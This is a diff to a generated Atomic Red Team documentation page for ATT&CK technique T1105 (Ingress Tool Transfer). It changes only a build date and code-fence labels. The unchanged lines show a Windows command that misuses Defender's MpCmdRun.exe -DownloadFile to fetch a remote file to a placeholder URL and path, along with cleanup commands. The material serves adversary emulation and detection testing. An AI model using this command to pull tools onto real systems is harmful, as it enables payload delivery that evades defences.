@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "815bef8b-bf91-4b67-be4c-abe4c2a94ccc"
@@ -60,14 +60,14 @@ Must have a Windows Defender version with MpCmdRun.exe installed
 
 ### Prerequisite Check
 
-```text
+```untitled
 cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
 MpCmdRun.exe /?  >nul 2>&1
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
 ```
 
@@ -77,14 +77,14 @@ Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually
 
 ### Command
 
-```commandprompt
+```cmd
 cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
 MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{local_path} >nul 2>&1
 del %temp%\MpCmdRun.log >nul 2>&1
 ```
